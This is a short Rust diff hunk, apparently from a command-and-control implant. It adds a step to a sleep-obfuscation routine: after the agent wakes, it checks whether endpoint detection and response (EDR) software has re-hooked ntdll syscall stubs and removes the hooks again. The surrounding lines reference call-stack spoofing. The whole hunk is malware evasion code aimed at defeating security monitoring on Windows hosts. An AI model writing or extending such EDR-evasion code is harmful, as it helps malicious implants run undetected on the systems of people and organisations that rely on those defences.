@@ -1095,6 +1095,21 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
         restore_call_stack(spoof);
     }
 
+    // ── 12. Post-wake ntdll hook re-check ──────────────────────────────────
+    //
+    // EDR may have re-hooked ntdll syscall stubs while the agent was sleeping
+    // (the sleep obfuscation made the agent's memory inaccessible, but EDR
+    // can still patch ntdll which is a shared module).  Check for hooks and
+    // re-unhook if necessary.
+    #[cfg(windows)]
+    {
+        if let Err(e) = crate::ntdll_unhook::maybe_unhook() {
+            log::warn!(
+                "[sleep_obfuscation] post-wake ntdll re-unhook failed: {e}"
+            );
+        }
+    }
+
     // Update region cache for potential reuse.
     {
         let mut cache = region_cache().lock().unwrap();
